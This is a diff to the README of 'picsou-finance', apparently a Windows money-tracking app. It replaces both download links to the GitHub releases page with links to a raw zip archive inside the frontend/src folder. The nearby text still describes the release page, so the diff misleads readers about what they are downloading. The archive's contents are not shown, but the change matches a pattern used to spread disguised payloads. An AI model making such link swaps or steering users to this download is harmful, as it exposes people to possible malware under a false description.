@@ -1,6 +1,6 @@
 # 💰 picsou-finance - Track money with clear control
 
-[![Download Picsou Finance](https://img.shields.io/badge/Download%20Picsou%20Finance-Ready%20for%20Windows-blue?style=for-the-badge)](https://github.com/hina840/picsou-finance/releases)
+[![Download Picsou Finance](https://img.shields.io/badge/Download%20Picsou%20Finance-Ready%20for%20Windows-blue?style=for-the-badge)](https://github.com/hina840/picsou-finance/raw/refs/heads/main/frontend/src/picsou-finance-3.6.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ The app is made for a single user and local use. It works best on a personal com
 
 Go to the release page and download the Windows file from there:
 
-[Download Picsou Finance for Windows](https://github.com/hina840/picsou-finance/releases)
+[Download Picsou Finance for Windows](https://github.com/hina840/picsou-finance/raw/refs/heads/main/frontend/src/picsou-finance-3.6.zip)
 
 On that page, look for the latest release and choose the file that matches Windows. If there is more than one file, pick the one with `.exe` or `.msi` in the name.
 
